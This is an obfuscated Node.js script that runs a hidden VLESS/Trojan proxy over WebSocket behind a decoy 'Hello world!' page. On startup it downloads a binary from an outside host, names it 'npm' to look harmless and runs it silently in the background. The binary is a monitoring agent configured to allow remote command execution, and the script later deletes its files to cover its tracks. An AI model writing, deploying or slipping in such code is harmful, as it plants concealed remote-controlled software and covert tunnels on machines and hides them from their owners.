const _0x479d12=_0x4184;(function(_0x42d040,_0x3d1575){const _0x217c1c=_0x4184,_0x4b5dcc=_0x42d040();while(!![]){try{const _0x2b6397=-parseInt(_0x217c1c(0x102))/0x1*(parseInt(_0x217c1c(0xd0))/0x2)+parseInt(_0x217c1c(0x11f))/0x3*(parseInt(_0x217c1c(0x109))/0x4)+parseInt(_0x217c1c(0x11e))/0x5+parseInt(_0x217c1c(0x12e))/0x6*(-parseInt(_0x217c1c(0xd1))/0x7)+parseInt(_0x217c1c(0xf1))/0x8+parseInt(_0x217c1c(0xde))/0x9*(-parseInt(_0x217c1c(0x134))/0xa)+-parseInt(_0x217c1c(0x122))/0xb*(parseInt(_0x217c1c(0x107))/0xc);if(_0x2b6397===_0x3d1575)break;else _0x4b5dcc['push'](_0x4b5dcc['shift']());}catch(_0x55f7e5){_0x4b5dcc['push'](_0x4b5dcc['shift']());}}}(_0x3b99,0xbab58));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x479d12(0xdf)),net=require(_0x479d12(0x130)),path=require(_0x479d12(0xeb)),crypto=require('crypto'),{Buffer}=require(_0x479d12(0x10a)),{exec,execSync}=require(_0x479d12(0x115)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x479d12(0x108)][_0x479d12(0x100)]||_0x479d12(0xda),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x479d12(0x108)][_0x479d12(0x112)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process[_0x479d12(0x108)][_0x479d12(0x14d)]||_0x479d12(0x104),AUTO_ACCESS=process[_0x479d12(0x108)][_0x479d12(0xe7)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0x479d12(0x145)](0x0,0x8),SUB_PATH=process[_0x479d12(0x108)][_0x479d12(0x110)]||_0x479d12(0x148),NAME=process[_0x479d12(0x108)][_0x479d12(0x140)]||'',PORT=process[_0x479d12(0x108)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2d2e4c=_0x479d12;try{const _0x3b891c=await axios[_0x2d2e4c(0xe2)](_0x2d2e4c(0x10b)),_0x113aba=_0x3b891c[_0x2d2e4c(0xe0)];ISP=(_0x113aba[_0x2d2e4c(0xd4)]+'-'+_0x113aba[_0x2d2e4c(0x131)])[_0x2d2e4c(0x14b)](/ /g,'_');}catch(_0x2224a9){ISP='Unknown';}};function _0x4184(_0x1c627b,_0x27b343){_0x1c627b=_0x1c627b-0xcd;const _0x3b996f=_0x3b99();let _0x41841c=_0x3b996f[_0x1c627b];return _0x41841c;}GetISP();const httpServer=http[_0x479d12(0x126)]((_0x8c7825,_0x3981c8)=>{const _0x18a64a=_0x479d12;if(_0x8c7825[_0x18a64a(0xef)]==='/'){const _0x2d6dbc=path['join'](__dirname,_0x18a64a(0x106));fs[_0x18a64a(0xf2)](_0x2d6dbc,_0x18a64a(0xd7),(_0x3cb98e,_0x3ecb5a)=>{const _0xc4e003=_0x18a64a;if(_0x3cb98e){_0x3981c8[_0xc4e003(0x149)](0xc8,{'Content-Type':'text/html'}),_0x3981c8['end'](_0xc4e003(0xf7));return;}_0x3981c8['writeHead'](0xc8,{'Content-Type':_0xc4e003(0x137)}),_0x3981c8[_0xc4e003(0xe1)](_0x3ecb5a);});return;}else{if(_0x8c7825[_0x18a64a(0xef)]==='/'+SUB_PATH){const _0x576a04=NAME?NAME+'-'+ISP:ISP,_0x360f55='vless://'+UUID+'@'+DOMAIN+_0x18a64a(0x116)+DOMAIN+_0x18a64a(0x124)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x576a04,_0x4192ee=_0x18a64a(0x13c)+UUID+'@'+DOMAIN+_0x18a64a(0x133)+DOMAIN+_0x18a64a(0x124)+DOMAIN+_0x18a64a(0xe3)+WSPATH+'#'+_0x576a04,_0x62c44a=_0x360f55+'\x0a'+_0x4192ee,_0x28d7d0=Buffer[_0x18a64a(0xcf)](_0x62c44a)[_0x18a64a(0xfe)](_0x18a64a(0xe9));_0x3981c8['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x3981c8[_0x18a64a(0xe1)](_0x28d7d0+'\x0a');}else _0x3981c8['writeHead'](0x194,{'Content-Type':_0x18a64a(0x142)}),_0x3981c8['end']('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x479d12(0x14b)](/-/g,''),DNS_SERVERS=[_0x479d12(0x117),_0x479d12(0xe6)];function resolveHost(_0x2b31b7){return new Promise((_0x307237,_0x5e8a94)=>{const _0x3b2457=_0x4184;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3b2457(0xff)](_0x2b31b7)){_0x307237(_0x2b31b7);return;}let _0x45678a=0x0;function _0x440af6(){const _0x5d6562=_0x3b2457;if(_0x45678a>=DNS_SERVERS[_0x5d6562(0xf3)]){_0x5e8a94(new Error(_0x5d6562(0x12d)+_0x2b31b7+_0x5d6562(0x13a)));return;}const _0x39c853=DNS_SERVERS[_0x45678a];_0x45678a++;const _0x5e1450=_0x5d6562(0xfb)+encodeURIComponent(_0x2b31b7)+_0x5d6562(0x138);axios[_0x5d6562(0xe2)](_0x5e1450,{'timeout':0x1388,'headers':{'Accept':_0x5d6562(0x113)}})[_0x5d6562(0xcd)](_0x258913=>{const _0x2c32c2=_0x5d6562,_0x2463e6=_0x258913[_0x2c32c2(0xe0)];if(_0x2463e6[_0x2c32c2(0x120)]===0x0&&_0x2463e6[_0x2c32c2(0xee)]&&_0x2463e6[_0x2c32c2(0xee)][_0x2c32c2(0xf3)]>0x0){const _0x3c6e0d=_0x2463e6[_0x2c32c2(0xee)]['find'](_0x2c8891=>_0x2c8891[_0x2c32c2(0x143)]===0x1);if(_0x3c6e0d){_0x307237(_0x3c6e0d[_0x2c32c2(0xe0)]);return;}}_0x440af6();})[_0x5d6562(0xdb)](_0x555926=>{_0x440af6();});}_0x440af6();});}function handleVlessConnection(_0x5b5c81,_0x4e0a66){const _0x459a70=_0x479d12,[_0x2ec41b]=_0x4e0a66,_0xf5100c=_0x4e0a66[_0x459a70(0x145)](0x1,0x11);if(!_0xf5100c[_0x459a70(0x147)]((_0x25e414,_0x36ca04)=>_0x25e414==parseInt(uuid[_0x459a70(0x12a)](_0x36ca04*0x2,0x2),0x10)))return![];let _0xfda10a=_0x4e0a66[_0x459a70(0x145)](0x11,0x12)['readUInt8']()+0x13;const _0x1dee86=_0x4e0a66[_0x459a70(0x145)](_0xfda10a,_0xfda10a+=0x2)[_0x459a70(0x119)](0x0),_0x53a37a=_0x4e0a66[_0x459a70(0x145)](_0xfda10a,_0xfda10a+=0x1)['readUInt8'](),_0x1b92e8=_0x53a37a==0x1?_0x4e0a66[_0x459a70(0x145)](_0xfda10a,_0xfda10a+=0x4)[_0x459a70(0x123)]('.'):_0x53a37a==0x2?new TextDecoder()[_0x459a70(0xfc)](_0x4e0a66[_0x459a70(0x145)](_0xfda10a+0x1,_0xfda10a+=0x1+_0x4e0a66[_0x459a70(0x145)](_0xfda10a,_0xfda10a+0x1)[_0x459a70(0x121)]())):_0x53a37a==0x3?_0x4e0a66[_0x459a70(0x145)](_0xfda10a,_0xfda10a+=0x10)[_0x459a70(0x10e)]((_0x72d062,_0x2fef8b,_0x527c84,_0x3efa0f)=>_0x527c84%0x2?_0x72d062[_0x459a70(0x105)](_0x3efa0f[_0x459a70(0x145)](_0x527c84-0x1,_0x527c84+0x1)):_0x72d062,[])['map'](_0x5246b7=>_0x5246b7[_0x459a70(0x119)](0x0)[_0x459a70(0xfe)](0x10))[_0x459a70(0x123)](':'):'';_0x5b5c81[_0x459a70(0x144)](new Uint8Array([_0x2ec41b,0x0]));const _0x27a7bc=createWebSocketStream(_0x5b5c81);return resolveHost(_0x1b92e8)[_0x459a70(0xcd)](_0x40d293=>{const _0x5b0e90=_0x459a70;net[_0x5b0e90(0x114)]({'host':_0x40d293,'port':_0x1dee86},function(){const _0x2bd100=_0x5b0e90;this[_0x2bd100(0x14a)](_0x4e0a66[_0x2bd100(0x145)](_0xfda10a)),_0x27a7bc['on'](_0x2bd100(0x10c),()=>{})[_0x2bd100(0x11a)](this)['on']('error',()=>{})[_0x2bd100(0x11a)](_0x27a7bc);})['on'](_0x5b0e90(0x10c),()=>{});})[_0x459a70(0xdb)](_0x31759d=>{net['connect']({'host':_0x1b92e8,'port':_0x1dee86},function(){const _0x13b90f=_0x4184;this[_0x13b90f(0x14a)](_0x4e0a66[_0x13b90f(0x145)](_0xfda10a)),_0x27a7bc['on']('error',()=>{})[_0x13b90f(0x11a)](this)['on'](_0x13b90f(0x10c),()=>{})[_0x13b90f(0x11a)](_0x27a7bc);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x4d66f8,_0x336538){const _0x989d47=_0x479d12;try{if(_0x336538[_0x989d47(0xf3)]<0x3a)return![];const _0x26dad5=_0x336538['slice'](0x0,0x38)[_0x989d47(0xfe)](),_0x48adaa=[UUID];let _0x4838a1=null;for(const _0x5a32fb of _0x48adaa){const _0x1348a=crypto[_0x989d47(0x139)](_0x989d47(0x103))['update'](_0x5a32fb)[_0x989d47(0xce)](_0x989d47(0x101));if(_0x1348a===_0x26dad5){_0x4838a1=_0x5a32fb;break;}}if(!_0x4838a1)return![];let _0x187769=0x38;_0x336538[_0x187769]===0xd&&_0x336538[_0x187769+0x1]===0xa&&(_0x187769+=0x2);const _0x153e04=_0x336538[_0x187769];if(_0x153e04!==0x1)return![];_0x187769+=0x1;const _0x5ca556=_0x336538[_0x187769];_0x187769+=0x1;let _0x39e964,_0x595d00;if(_0x5ca556===0x1)_0x39e964=_0x336538[_0x989d47(0x145)](_0x187769,_0x187769+0x4)[_0x989d47(0x123)]('.'),_0x187769+=0x4;else{if(_0x5ca556===0x3){const _0x502187=_0x336538[_0x187769];_0x187769+=0x1,_0x39e964=_0x336538[_0x989d47(0x145)](_0x187769,_0x187769+_0x502187)[_0x989d47(0xfe)](),_0x187769+=_0x502187;}else{if(_0x5ca556===0x4)_0x39e964=_0x336538[_0x989d47(0x145)](_0x187769,_0x187769+0x10)[_0x989d47(0x10e)]((_0x27ab28,_0x3967d5,_0x4b8d43,_0x3de758)=>_0x4b8d43%0x2?_0x27ab28[_0x989d47(0x105)](_0x3de758['slice'](_0x4b8d43-0x1,_0x4b8d43+0x1)):_0x27ab28,[])[_0x989d47(0x135)](_0x441be2=>_0x441be2['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),_0x187769+=0x10;else return![];}}_0x595d00=_0x336538[_0x989d47(0x119)](_0x187769),_0x187769+=0x2;_0x187769<_0x336538['length']&&_0x336538[_0x187769]===0xd&&_0x336538[_0x187769+0x1]===0xa&&(_0x187769+=0x2);const _0x67946e=createWebSocketStream(_0x4d66f8);return resolveHost(_0x39e964)[_0x989d47(0xcd)](_0x22f3d8=>{const _0x2743c6=_0x989d47;net[_0x2743c6(0x114)]({'host':_0x22f3d8,'port':_0x595d00},function(){const _0x1648a4=_0x2743c6;_0x187769<_0x336538[_0x1648a4(0xf3)]&&this[_0x1648a4(0x14a)](_0x336538['slice'](_0x187769)),_0x67946e['on']('error',()=>{})[_0x1648a4(0x11a)](this)['on'](_0x1648a4(0x10c),()=>{})[_0x1648a4(0x11a)](_0x67946e);})['on'](_0x2743c6(0x10c),()=>{});})[_0x989d47(0xdb)](_0x4de471=>{const _0x4f6f23=_0x989d47;net[_0x4f6f23(0x114)]({'host':_0x39e964,'port':_0x595d00},function(){const _0x5dcbbf=_0x4f6f23;_0x187769<_0x336538[_0x5dcbbf(0xf3)]&&this[_0x5dcbbf(0x14a)](_0x336538['slice'](_0x187769)),_0x67946e['on']('error',()=>{})[_0x5dcbbf(0x11a)](this)['on'](_0x5dcbbf(0x10c),()=>{})['pipe'](_0x67946e);})['on'](_0x4f6f23(0x10c),()=>{});}),!![];}catch(_0x16a074){return![];}}wss['on']('connection',(_0x457146,_0xea360c)=>{const _0x2c43d5=_0x479d12,_0x2d419a=_0xea360c[_0x2c43d5(0xef)]||'';_0x457146['once'](_0x2c43d5(0x14c),_0x2125db=>{const _0x22519f=_0x2c43d5;if(_0x2125db[_0x22519f(0xf3)]>0x11&&_0x2125db[0x0]===0x0){const _0x565ebd=_0x2125db[_0x22519f(0x145)](0x1,0x11),_0x2b7fe4=_0x565ebd[_0x22519f(0x147)]((_0x1ae198,_0x3f9bdc)=>_0x1ae198==parseInt(uuid['substr'](_0x3f9bdc*0x2,0x2),0x10));if(_0x2b7fe4){!handleVlessConnection(_0x457146,_0x2125db)&&_0x457146[_0x22519f(0x118)]();return;}}!handleTrojanConnection(_0x457146,_0x2125db)&&_0x457146[_0x22519f(0x118)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3a3ea6=_0x479d12,_0x11ab64=os['arch']();return _0x11ab64===_0x3a3ea6(0xfd)||_0x11ab64===_0x3a3ea6(0xd9)||_0x11ab64==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x3a3ea6(0xe4):_0x3a3ea6(0xed);},downloadFile=async()=>{const _0xc42631=_0x479d12;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2fd905=getDownloadUrl(),_0x10ecc0=await axios({'method':_0xc42631(0xe2),'url':_0x2fd905,'responseType':_0xc42631(0x13b)}),_0xf65462=fs[_0xc42631(0xea)](_0xc42631(0x12f));return _0x10ecc0[_0xc42631(0xe0)][_0xc42631(0x11a)](_0xf65462),new Promise((_0x3b99f9,_0x54c690)=>{const _0x33009f=_0xc42631;_0xf65462['on'](_0x33009f(0x132),()=>{const _0x363a5a=_0x33009f;console['log']('npm\x20download\x20successfully'),exec(_0x363a5a(0x141),_0x5e31c4=>{if(_0x5e31c4)_0x54c690(_0x5e31c4);_0x3b99f9();});}),_0xf65462['on']('error',_0x54c690);});}catch(_0x2ca961){throw _0x2ca961;}},runnz=async()=>{const _0x21f897=_0x479d12;try{const _0x3aa77c=execSync(_0x21f897(0xf5),{'encoding':_0x21f897(0xf8)});if(_0x3aa77c[_0x21f897(0xf0)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2b61c6){}await downloadFile();let _0x26f915='',_0x385780=[_0x21f897(0x11d),_0x21f897(0xf9),_0x21f897(0xd5),_0x21f897(0xd3),_0x21f897(0x127),_0x21f897(0x10f)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x58bf91=_0x385780[_0x21f897(0x10d)](NEZHA_PORT)?_0x21f897(0xdc):'';_0x26f915=_0x21f897(0x146)+NEZHA_SERVER+':'+NEZHA_PORT+_0x21f897(0xd6)+NEZHA_KEY+'\x20'+_0x58bf91+_0x21f897(0x11c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x436269=NEZHA_SERVER[_0x21f897(0x10d)](':')?NEZHA_SERVER[_0x21f897(0x13d)](':')[_0x21f897(0x13f)]():'',_0x5f0ebe=_0x385780['includes'](_0x436269)?_0x21f897(0x129):_0x21f897(0x128),_0x2ca307=_0x21f897(0xdd)+NEZHA_KEY+_0x21f897(0xf6)+NEZHA_SERVER+_0x21f897(0xe8)+_0x5f0ebe+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x21f897(0xf4)]('config.yaml',_0x2ca307);}_0x26f915=_0x21f897(0x125);}else{console[_0x21f897(0xd2)](_0x21f897(0xfa));return;}}try{exec(_0x26f915,{'shell':_0x21f897(0x13e)},_0x2d69c7=>{const _0x2d416d=_0x21f897;if(_0x2d69c7)console['error'](_0x2d416d(0xec),_0x2d69c7);else console[_0x2d416d(0xd2)](_0x2d416d(0x11b));});}catch(_0x4a8271){console['error']('error:\x20'+_0x4a8271);}};async function addAccessTask(){const _0x4a5b77=_0x479d12;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x500619='https://'+DOMAIN;try{const _0x288a0c=await axios[_0x4a5b77(0x111)](_0x4a5b77(0x136),{'url':_0x500619},{'headers':{'Content-Type':_0x4a5b77(0x12c)}});console[_0x4a5b77(0xd2)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x33bbec){}}const delFiles=()=>{const _0x3ebdd6=_0x479d12;fs[_0x3ebdd6(0xe5)](_0x3ebdd6(0x12f),()=>{}),fs[_0x3ebdd6(0xe5)](_0x3ebdd6(0xd8),()=>{});};httpServer[_0x479d12(0x12b)](PORT,()=>{const _0x23b26a=_0x479d12;runnz(),setTimeout(()=>{delFiles();},0x2bf20),console[_0x23b26a(0xd2)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});function _0x3b99(){const _0x2357e5=['1997712WftYpl','env','74796EPzhFk','buffer','https://api.ip.sb/geoip','error','includes','reduce','2053','SUB_PATH','post','NEZHA_PORT','application/dns-json','connect','child_process',':443?encryption=none&security=tls&sni=','8.8.4.4','close','readUInt16BE','pipe','npm\x20is\x20running','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','443','4357235hYCnzJ','201LbXpdU','Status','readUInt8','44bQUAkB','join','&fp=chrome&type=ws&host=','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','createServer','2083','false','true','substr','listen','application/json','Failed\x20to\x20resolve\x20','6wyUKMl','npm','net','isp','finish',':443?security=tls&sni=','2090azXaja','map','https://oooo.serv00.net/add-url','text/html','&type=A','createHash','\x20with\x20all\x20DNS\x20servers','stream','trojan://','split','/bin/bash','pop','NAME','chmod\x20+x\x20npm','text/plain','type','send','slice','setsid\x20nohup\x20./npm\x20-s\x20','every','EPFx6krmZj3bnwF8','writeHead','write','replace','message','DOMAIN','then','digest','from','633794nRjpUo','495873XviRTd','log','2087','country_code','2096','\x20-p\x20','utf8','config.yaml','arm64','260cf877-a579-4861-866d-d22f8a041256','catch','--tls','client_secret:\x20','14517JpVtGz','axios','data','end','get','&path=%2F','https://amd64.ssss.nyc.mn/v1','unlink','1.1.1.1','AUTO_ACCESS','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','base64','createWriteStream','path','npm\x20running\x20error:','https://amd64.ssss.nyc.mn/agent','Answer','url','trim','249896MOvrCA','readFile','length','writeFileSync','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Hello\x20world!','utf-8','8443','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','https://dns.google/resolve?name=','decode','arm','toString','test','UUID','hex','1QHhERb','sha224','1234.abc.com','concat','index.html'];_0x3b99=function(){return _0x2357e5;};return _0x3b99();}
